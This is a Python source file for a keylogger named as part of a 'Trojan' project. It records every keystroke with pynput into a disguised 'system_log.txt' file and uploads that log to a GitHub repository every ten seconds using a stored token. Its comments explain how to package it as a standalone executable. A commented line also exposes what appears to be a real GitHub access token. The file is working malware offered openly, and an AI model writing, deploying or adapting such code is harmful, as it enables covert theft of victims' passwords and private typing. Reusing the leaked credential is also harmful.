import base64
import github3
import os
import random
import time

from datetime import datetime
from pynput import keyboard
#! Used a venv to install pynput
#? pip install pynput
#* https://pypi.org/project/pynput/
#* https://pynput.readthedocs.io/en/latest/keyboard.html

#! This will package with the command: pyinstaller --onefile keylogger.py
#* https://pypi.org/project/pyinstaller/

PATH = os.getcwd()

LOG = f'./system_log.txt'
TOK = f'./github_token.tok'
REP = 'Trojan'
REP_KEY_PTH = 'data'

def github_connect():

    try:
        with open(TOK) as file:
            token = file.read()
    except Exception as e:
        print(f'Error:{e}')

    user = 'agogeio'
    sess = github3.login(token=token)
    # sess = github3.login(token='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')
    #* To allow you to specify either a username and password combination or
    #* a token, none of the parameters are required. If you provide none of
    #* them, you will receive ``None``.
    # print(f'Session: {sess}')

    try:
        github = sess.repository(user, REP)
        #? Gets the requested repo
        # print(f'GitHub Repo: {github}')
        return github
    except Exception as e:
        print(f'GitHub connection error: {e}')
        return e


class KeyLogger:
    def __init__(self) -> None:
        self.keys = []

    def write_file(self, keys):
        with open('./system_log.txt', 'w') as file:
            for key in keys:

                #? Identify up single and double quote characters
                if str(key) == '''"'"''':
                    clean_key = "'"
                elif str(key) == """'"'""":
                    clean_key = '"'
                else:
                    clean_key = str(key).replace("'", '', 2)

                if clean_key == 'Key.space':
                    clean_key = ' '
                elif clean_key == 'Key.shift':
                    clean_key = ' [SHFT] '
                elif clean_key == 'Key.backspace':
                    clean_key = ' [BKSP] '
                elif clean_key == 'Key.ctrl':
                    clean_key = ' [CTRL] '
                elif clean_key == 'Key.caps_lock':
                    clean_key = ' [CPLK] '
                elif clean_key == 'Key.enter':
                    clean_key = '\n'

                file.write(str(clean_key))


    def on_press(self, key):
        try:
            # print('alphanumeric key {0} pressed'.format(key.char))
            self.keys.append(key)
            self.write_file(self.keys)
        except AttributeError:
            print('special key {0} pressed'.format(key))


    def on_release(self, key):
        if key == keyboard.Key.esc:
            pass
            # Stop listener
            # return False

    #? This will run the code in blocking fashion (we need this)
    # Collect events until released
    def activate(self):
        # with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
        #     listener.join()

    #? This will run the code as a none blocking thread
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()


class GithubUpload:
    def __init__(self) -> None:
        self.data_path = f'{REP_KEY_PTH}/{id}/'
        self.repo = github_connect()   
        

    def store_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'{REP_KEY_PTH}/kl-{message}.kl'
        bindata = bytes('%r' % data, 'utf-8')


        try:
            self.repo.create_file(remote_path, message, bindata)
            #? Human readable above
            # self.repo.create_file(remote_path, message, base64.b64encode(bindata))
            #? This is the remote_path in the GitHub repo not on the local machine
            #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
            #? base64 encoded
        except Exception as e:
            print(f'Error in store_module_result: {e}')


def run(**args):
    kl = KeyLogger()
    kl.activate()

    gu = GithubUpload()

    while True:
        rand = random.randrange(5,15)
        # time.sleep(60*rand)
        time.sleep(10)
        with open('system_log.txt', 'r') as file:
            content = file.read()
            gu.store_result(content)


if __name__ == '__main__':
    run()